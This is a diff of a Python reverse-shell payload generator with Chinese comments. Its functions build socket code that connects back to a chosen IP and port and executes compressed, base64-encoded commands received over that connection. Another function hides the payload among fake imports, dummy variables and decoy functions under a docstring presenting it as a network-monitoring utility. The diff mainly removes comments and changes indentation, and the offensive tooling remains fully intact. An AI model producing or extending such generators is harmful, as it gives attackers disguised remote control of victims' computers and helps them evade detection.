@@ -25,16 +25,12 @@ def split_string(s, chunk_size=50):
 
 def gene_code_obfuscated(ip, port, retry=10, delay=5):
     """生成混淆的反向Shell连接代码"""
-    # 分解关键字符串
     imports = ["socket", "zlib", "base64", "struct", "time"]
     random.shuffle(imports)
     
-    # 使用变量名混淆
     var_names = generate_random_strings()
-    var_list = list(var_names.keys())
     
-    template = """# -*- coding: utf-8 -*-
-import {imports}
+    template = """import {imports}
 {random_vars}
 def {func_name}():
     {var1} = 2
@@ -56,7 +52,6 @@ def {func_name}():
     exec(zlib.decompress(base64.b64decode({data})), {{'{sock}': {sock}}})
 {func_name}()"""
     
-    # 生成随机变量赋值
     random_var_assignments = '\n'.join([f"{k} = '{v}'" for k, v in var_names.items()])
     
     code = template.format(
@@ -82,7 +77,7 @@ def {func_name}():
 
 
 def gene_code(ip, port, retry=10, delay=5):
-    """生成反向Shell连接代码（简单版本）"""
+    """生成反向Shell连接代码"""
     s = """import socket,zlib,base64,struct,time
 for x in range(%d):
     try:
@@ -106,7 +101,6 @@ def generate_random_string(length=10):
 
 def advanced_obfuscate_code(code):
     """高级代码混淆"""
-    # 添加假的导入和函数
     fake_imports = [
         "import urllib.request",
         "import urllib.parse", 
@@ -139,7 +133,6 @@ def advanced_obfuscate_code(code):
         return False"""
     ]
     
-    # 生成随机变量
     dummy_vars = []
     for i in range(random.randint(3, 7)):
         var_name = ''.join(random.choices(string.ascii_letters, k=8))
@@ -151,9 +144,7 @@ def advanced_obfuscate_code(code):
         ])
         dummy_vars.append(f"{var_name} = {var_value}")
     
-    # 组装混淆代码
     obfuscated = f"""#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 '''
 Network connectivity and system monitoring utility
 Generated on: {datetime.datetime.now()}
@@ -162,17 +153,14 @@ Version: {random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}
 
 {chr(10).join(fake_imports)}
 
-# Configuration variables
 {chr(10).join(dummy_vars)}
 
 {chr(10).join(fake_functions)}
 
 def main_process():
     '''Main processing function'''
-    # Initialize system check
     if check_network_connection():
-        # Process network data
-{chr(10).join(['    ' + line for line in code.split(chr(10))])}
+{chr(10).join(['        ' + line for line in code.split(chr(10))])}
 
 if __name__ == '__main__':
     main_process()
